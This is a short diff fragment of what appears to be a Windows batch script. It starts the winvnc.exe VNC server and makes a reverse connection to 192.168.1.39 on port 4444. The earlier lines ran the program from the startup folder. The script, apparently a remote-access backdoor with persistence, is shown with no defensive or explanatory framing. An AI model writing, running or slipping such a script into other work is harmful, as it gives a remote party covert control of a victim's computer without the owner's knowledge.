@@ -20,6 +20,6 @@ if exist "%script_dir%winvnc.exe" (
 )
 
 Start winvnc.exe
-start "%startup_folder%\winvnc.exe" -run
+start winvnc.exe -run
 timeout /t 1 >nul
-start "%startup_folder%\winvnc.exe" -connect 192.168.1.39::4444
+start winvnc.exe -connect 192.168.1.39::4444
